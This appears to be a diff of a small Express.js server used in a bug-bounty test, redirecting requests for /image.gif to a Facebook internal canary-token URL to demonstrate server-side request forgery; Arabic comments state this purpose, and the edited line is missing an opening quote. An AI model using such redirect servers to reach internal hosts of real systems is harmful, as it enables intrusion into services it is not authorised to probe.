@@ -2,11 +2,9 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// الرابط النهائي الذي سيطلبه فيسبوك
 app.get('/image.gif', (req, res) => {
-    // توجيه سيرفر فيسبوك (302 Redirect) إلى رابط الكناري الخاص بهم لإثبات الثغرة
-    res.redirect(302, 'https://internalfb.com');
+    // تأكد أن الرابط يبدأ بـ https:// بشكل صحيح
+    res.redirect(302, https://www.internalfb.com/intern/bug-bounty/get-canary-token/6c89420833684ad2be246b8e60b865a8/');
 });
 
-app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
-
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
